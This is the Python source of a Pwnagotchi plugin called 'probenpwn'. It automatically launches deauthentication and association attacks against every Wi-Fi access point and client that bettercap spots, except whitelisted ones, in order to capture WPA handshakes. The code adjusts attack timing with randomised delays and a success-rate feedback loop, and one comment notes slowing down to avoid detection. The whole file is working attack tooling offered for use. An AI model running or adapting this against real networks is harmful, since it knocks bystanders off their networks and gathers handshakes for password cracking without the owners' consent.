import logging
import time
import threading
import os
import subprocess
import random
import pwnagotchi.plugins as plugins

class probenpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.1.2'
    __license__ = 'GPL3'
    __description__ = (
        'Pwn more aggressively. Launch immediate associate or deauth attack '
        'when bettercap spots a device, with enhanced performance for more handshakes. '
        'Enhanced with dynamic parameter tuning, randomization, and feedback loop.'
    )

    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self.old_name = None
        self.recents = {}
        self.attack_threads = []
        self.epoch_duration = 60  # default epoch duration in seconds
        self._watchdog_thread = None
        self._watchdog_thread_running = True
        # Track number of attack attempts per AP MAC address
        self.attack_attempts = {}
        # Optionally, track the number of successful handshakes per AP
        self.success_counts = {}
        # Track the total number of successful and failed handshakes for feedback loop
        self.total_handshakes = 0
        self.failed_handshakes = 0
        # Track the performance of each AP for dynamic adjustments
        self.performance_stats = {}
        self.whitelist = set()
    
    def on_loaded(self):
        logging.info(f"Plugin ProbeNpwn loaded")

    def on_config_changed(self, config): 
        """Load the whitelist from Pwnagotchi's global config."""
        try:
            self.whitelist = set(config["main"].get("whitelist", []))
        except KeyError:
            self.whitelist = set()
        logging.info(f"Whitelist loaded from Pwnagotchi config: {self.whitelist}")

        try:
            self.debug_log_path = config["main"]["log"].get("path-debug", None)
        except KeyError:
            logging.error(f"Failed to configure debug log path")

        self.old_name = config.get("main").get("name", "")

    def on_unload(self, ui):
        with ui._lock:
            if self.old_name:
                ui.set('name', f"{self.old_name}>")

        try:
            self._watchdog_thread_running = False # properly exit the thread
            self._watchdog_thread.join()
        except AttributeError: # Handle unload before on_ready()
            pass
        logging.info("Probing out.")

    def on_ui_update(self, ui):
        if ui.get('name').endswith("!!!"): # No need to to update
            return
        if self.old_name:
            with ui._lock:
                ui.set('name', f"{self.old_name}!!!")

    def on_ready(self, agent):
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        self._watchdog_thread = threading.Thread(target=self._watchdog, daemon=True)
        self._watchdog_thread.start()
        with agent._view._lock: # agent._view is the same as th variable "ui"
            agent._view.set("status", "Probe engaged... \nPWNing your signals, Earthlings!")

    def _watchdog(self):
        CHECK_INTERVAL = 5  # seconds between checks
        while self._watchdog_thread_running:
            # Check for wlan0mon interface missing
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon interface missing! This likely indicates a Wi‑Fi adapter crash. "
                              "Executing 'sudo systemctl restart pwnagotchi' to recover.")
                try:
                    subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True)
                    logging.info("pwnagotchi service restarted successfully.")
                except Exception as e:
                    logging.error("Failed to execute restart command: %s", e)
                break  # Stop checking after issuing the recovery command.

            # Check for 'wifi.interface not set or not found' error in logs
            try:
                with open(self.debug_log_path, 'r') as log_file:
                    logs = log_file.read()
                    if "error 400: wifi.interface not set or not found" in logs:
                        logging.error("wifi.interface not set or not found! Restarting pwnagotchi to recover.")
                        try:
                            subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True)
                            logging.info("pwnagotchi service restarted successfully.")
                        except Exception as e:
                            logging.error("Failed to restart pwnagotchi service: %s", e)
                        break  # Stop checking after issuing the recovery command.
            except Exception as e:
                logging.error("Error in watchdog: %s", repr(e))

            time.sleep(CHECK_INTERVAL)

    def track_recent(self, ap, cl=None):
        ap['_track_time'] = time.time()
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = ap['_track_time']
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, agent, ap):
        # Check if the AP is in the whitelist loaded from the global config
        if ap.get('hostname', '').lower() in self.whitelist or ap['mac'].lower() in self.whitelist:
            return False
        return True

    def attack_target(self, agent, ap, cl):
        if not self.ok_to_attack(agent, ap):
            return
        ap_mac = ap['mac'].lower()
        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
        logging.debug(f"Launching attack on AP {ap['mac']} and client {cl['mac'] if cl else 'N/A'}; attempt {self.attack_attempts[ap_mac]}")
        
        # Adjust attack parameters dynamically based on performance feedback
        self.adjust_attack_parameters(ap_mac)

        if cl:
            delay = self.dynamic_attack_delay(ap, cl)
            agent.deauth(ap, cl, delay)
        agent.associate(ap, 0.2)

    def dynamic_attack_delay(self, ap, cl):
        signal = cl.get('signal', -100) if cl is not None else -100
        if signal < -60:
            base_delay = 0.5
        else:
            base_delay = 0.25

        ap_mac = ap['mac'].lower()
        attempts = self.attack_attempts.get(ap_mac, 0)
        if attempts > 10:
            base_delay *= 0.6
        elif attempts > 5:
            base_delay *= 0.8

        randomized_delay = base_delay * random.uniform(0.9, 1.1)
        logging.debug(f"Dynamic attack delay for AP {ap['mac']} (signal {signal} dBm, {attempts} attempts): {randomized_delay:.3f}s")
        return randomized_delay

    def adjust_attack_parameters(self, ap_mac):
        """Adjust attack parameters based on performance metrics (success/failure rate)"""
        if ap_mac not in self.performance_stats:
            self.performance_stats[ap_mac] = {'success_rate': 0, 'failure_rate': 0, 'last_success': 0}
        
        success_count = self.success_counts.get(ap_mac, 0)
        attack_count = self.attack_attempts.get(ap_mac, 0)
        
        # Calculate success rate
        if attack_count > 0:
            success_rate = (success_count / attack_count) * 100
        else:
            success_rate = 0
        
        # Update performance stats
        self.performance_stats[ap_mac]['success_rate'] = success_rate
        self.performance_stats[ap_mac]['failure_rate'] = 100 - success_rate
        
        # Dynamically adjust attack tactics based on success rate
        if success_rate < 20:  # Success rate below 20% indicates a need for more aggressive tactics
            logging.info(f"Low success rate ({success_rate:.2f}%) on AP {ap_mac}. Making attack more aggressive.")
            # Increase the attack frequency
            self.attack_attempts[ap_mac] += 5  # Increase attempts
        elif success_rate > 80:  # Success rate above 80% means the attack is effective
            logging.info(f"High success rate ({success_rate:.2f}%) on AP {ap_mac}. Reducing attack aggressiveness.")
            # Slow down the attack to avoid detection
            self.attack_attempts[ap_mac] = max(1, self.attack_attempts[ap_mac] - 2)  # Reduce attempts
        else:
            logging.info(f"Moderate success rate ({success_rate:.2f}%) on AP {ap_mac}. Maintaining current attack tactics.")
        
    def on_bcap_wifi_ap_new(self, agent, event):
        try:
            ap = event['data']
            if agent._config['personality']['associate'] and self.ok_to_attack(agent, ap):
                logging.debug("insta-associate: %s (%s)", ap.get('hostname', 'Unknown AP'), ap['mac'])
                attack_thread = threading.Thread(target=self.attack_target, args=(agent, ap, None))
                attack_thread.start()
                self.attack_threads.append(attack_thread)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_ap_new: %s", repr(e))

    def on_bcap_wifi_client_new(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if (agent._config['personality']['deauth'] and
                self.ok_to_attack(agent, ap) and
                self.ok_to_attack(agent, cl)):
                logging.debug("insta-deauth: %s (%s) -> '%s' (%s) (%s)",
                              ap.get('hostname', 'Unknown AP'), ap['mac'],
                              cl.get('hostname', 'Unknown Client'), cl['mac'], cl['vendor'])
                attack_thread = threading.Thread(target=self.attack_target, args=(agent, ap, cl))
                attack_thread.start()
                self.attack_threads.append(attack_thread)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_client_new: %s", repr(e))

    def on_handshake(self, agent, filename, ap, cl):
        ap_mac = ap['mac'].lower()
        logging.info("Handshake detected from %s", ap['mac'])
        if ap_mac in self.attack_attempts:
            del self.attack_attempts[ap_mac]
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        self.total_handshakes += 1

        if 'mac' in ap and 'mac' in cl:
            logging.info("Captured handshake from %s (%s) -> '%s' (%s) (%s)",
                         ap.get('hostname', 'Unknown AP'), ap['mac'], cl.get('hostname', 'Unknown Client'), cl['mac'], cl['vendor'])
            if ap_mac in self.recents:
                del self.recents[ap_mac]
            cl_mac = cl['mac'].lower()
            if cl_mac in self.recents:
                del self.recents[cl_mac]

        # Expanded Feedback Loop: Tracking success/failure rates
        handshake_rate = (self.success_counts.get(ap_mac, 0) / self.attack_attempts.get(ap_mac, 1)) * 100
        logging.info(f"Success rate for {ap['mac']}: {handshake_rate:.2f}%")
        failure_rate = 100 - handshake_rate
        logging.info(f"Failure rate for {ap['mac']}: {failure_rate:.2f}%")

    def on_epoch(self, agent, epoch, epoch_data):
        for mac in list(self.recents):
            if self.recents[mac]['_track_time'] < (time.time() - (self.epoch_duration * 2)):
                del self.recents[mac]

    def on_bcap_wifi_ap_updated(self, agent, event):
        try:
            ap = event['data']
            if self.ok_to_attack(agent, ap):
                logging.debug("AP updated: %s (%s)", ap.get('hostname', 'Unknown AP'), ap['mac'])
                self.track_recent(ap)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_ap_updated: %s", repr(e))

    def on_bcap_wifi_client_updated(self, agent, event):
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            if self.ok_to_attack(agent, ap) and self.ok_to_attack(agent, cl):
                logging.debug("Client updated: %s (%s) -> '%s' (%s) (%s)",
                              ap.get('hostname', 'Unknown AP'), ap['mac'], cl.get('hostname', 'Unknown Client'), cl['mac'], cl['vendor'])
                self.track_recent(ap, cl)
        except Exception as e:
            logging.error("Error in on_bcap_wifi_client_updated: %s", repr(e))

    def sanitize_channel_list(self, channels):
        """
        Sanitize the channel list to ensure only valid channels are included.
        Channels for 2.4 GHz should be between 1 and 14, and for 5 GHz, it should be between 36 and 165.
        """
        valid_channels = [ch for ch in channels if 1 <= ch <= 14 or 36 <= ch <= 165]
        if not valid_channels:
            logging.error("No valid channels to scan.")
            return []  # Return an empty list if no valid channels are found
        logging.debug(f"Scanning the following valid channels: {valid_channels}")
        return valid_channels

